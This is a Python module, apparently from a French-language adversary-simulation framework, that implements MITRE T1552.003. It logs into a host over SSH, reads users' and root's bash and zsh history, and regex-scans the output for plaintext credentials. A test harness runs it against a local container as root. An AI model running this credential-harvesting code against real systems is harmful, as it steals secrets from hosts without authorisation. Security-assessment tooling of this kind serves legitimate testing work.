#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 23 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import Dict, Any, Optional, List

from tactics.execution.command_execution import CommandExecution
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger
from tactics.credential_access.data.bash_history_read_helper import (
    COMMANDS, TARGETS, COMPILED_PATTERNS
)

logger = get_logger()


class BashHistoryRead(CommandExecution):
    """
    Lecture de l'historique bash/zsh pour extraire des credentials en clair.
    Technique MITRE ATT&CK: T1552.003
    """

    def __init__(
        self,
        name: str = "bash_history_read",
        timeout: int = 2,
        exec_timeout: int = 10,
        **kwargs
    ):
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.history_result: Dict[str, Any] = {}
        self.found_credentials: List[Dict] = []
        self.sensitive_lines: List[str] = []

    # =========================================================================
    # PARSING
    # =========================================================================

    def _scan_history(self, text: str, source: str) -> List[Dict]:
        """Scanne un bloc d'historique avec les patterns compilés du helper."""
        found = []
        if not text:
            return found

        for line in text.strip().splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for regex, cred_type in COMPILED_PATTERNS:
                match = regex.search(line)
                if match:
                    self.sensitive_lines.append(line)
                    found.append({
                        "source": source,
                        "type": cred_type,
                        "line": line[:200],
                        "match": match.group(0)[:100],
                    })
                    break  # une seule détection par ligne

        return found

    def _is_failed(self, cmd: str, output: str) -> bool:
        indicator = COMMANDS.get(cmd, {}).get("fail_indicator")
        return bool(indicator and output.strip() == indicator)

    def _compute_severity(self) -> str:
        if len(self.found_credentials) >= 3:
            return "CRITICAL"
        if self.found_credentials:
            return "HIGH"
        if self.sensitive_lines:
            return "MEDIUM"
        return "LOW"

    # =========================================================================
    # CORE ASYNC
    # =========================================================================

    async def _read_async(self, ip, port, username, password, pkey=None) -> Dict[str, Any]:
        self.log(f"Début BashHistoryRead sur {username}@{ip}:{port}", log=True)
        self.start_time = time.time()

        exec_result = await self.exec_command_async(
            ip=ip, port=port, username=username, password=password,
            pkey=pkey, commands=list(COMMANDS.keys()),
        )

        self.end_time = time.time()
        self.history_result = exec_result

        for cmd, data in exec_result.get("results", {}).get("commands", {}).items():
            out = data["stdout"]
            # print("CMD :", cmd, "\n", out)
            if self._is_failed(cmd, out):
                self.log(f"Accès refusé : {COMMANDS.get(cmd, {}).get('description', cmd)}", log=True)
                continue

            if "bash_history" in cmd and "wc" not in cmd:
                source = "root_bash" if "/root/" in cmd else "bash_history"
                self.found_credentials.extend(self._scan_history(out, source))
            elif "zsh_history" in cmd:
                self.found_credentials.extend(self._scan_history(out, "zsh_history"))
            elif "for u in" in cmd:
                self.found_credentials.extend(self._scan_history(out, "home_users_history"))

        # Dédupliquer par ligne
        seen = set()
        unique = []
        for c in self.found_credentials:
            if c["line"] not in seen:
                seen.add(c["line"])
                unique.append(c)
        self.found_credentials = unique

        self.log(f"BashHistoryRead terminé — {len(self.found_credentials)} credential(s)", log=True)
        return self._get_result()

    async def read_async(self, ip, port, username, password, total_timeout=None, pkey=None) -> Dict[str, Any]:
        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    return await self._read_async(ip, port, username, password, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
                return self._get_result()
        return await self._read_async(ip, port, username, password, pkey=pkey)

    def read_sync(self, *args, **kwargs) -> Dict[str, Any]:
        return asyncio.run(self.read_async(*args, **kwargs))

    # =========================================================================
    # RÉSULTAT
    # =========================================================================

    def _get_result(self) -> Dict[str, Any]:
        self.save()
        results = self.history_result.get("results", {})
        return {
            "severity": self._compute_severity(),
            "elapsed": self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": [MITRE.get("BashHistoryRead", {})],
            "results": {
                "credentials_found": self.found_credentials,
                "credentials_count": len(self.found_credentials),
                "sensitive_lines_count": len(self.sensitive_lines),
                "commands": results.get("commands", {}),
                "success_number": results.get("success_number", 0),
                "success_rate": results.get("success_rate", 0.0),
            },
        }


# =============================================================================
# Test
# =============================================================================

def test_bash_history_read(
    ip: str = "172.17.0.2", port: int = 22,
    username: str = "root", password: str = "toor",
    total_timeout: float = 30.0, pkey=None
):
    print(f"\n📜 Test BashHistoryRead sur {username}@{ip}:{port}")
    print("-" * 50)

    result = BashHistoryRead(timeout=5, exec_timeout=15).read_sync(
        ip=ip, port=port, username=username, password=password,
        total_timeout=total_timeout, pkey=pkey
    )

    severity = result.get("severity", "UNKNOWN")
    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    r = result.get("results", {})

    print(f"\n{icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {result.get('elapsed', 0):.2f}s")
    print(f"🔑 Credentials trouvés : {r.get('credentials_count', 0)}")
    for c in r.get("credentials_found", []):
        print(f"   [{c['type']}] {c['line'][:80]}...")
    return result


if __name__ == "__main__":
    test_bash_history_read()